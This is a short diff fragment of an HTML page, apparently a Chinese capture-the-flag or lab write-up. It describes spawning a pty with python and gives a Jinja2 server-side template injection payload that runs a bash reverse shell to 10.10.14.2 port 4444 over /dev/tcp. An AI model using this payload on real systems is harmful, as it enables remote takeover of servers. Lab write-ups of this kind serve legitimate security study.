@@ -128,7 +128,7 @@
 <p>成功弹到shell，可以用python建立一个伪终端</p>
 <p><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></p>
 <p>看大佬还可以用ssti</p>
-<p>在<code>/archive</code>页面可以触发，可以在post里的title触发</p>
+<p>在<code>/archive</code>页面可以触发</p>
 <p><img alt="image-20201203155607423" src="../img/image-20201203155607423.png" /></p>
 <p>同样可以反弹shell</p>
 <pre><code>{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system'](&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1'&quot;)}}
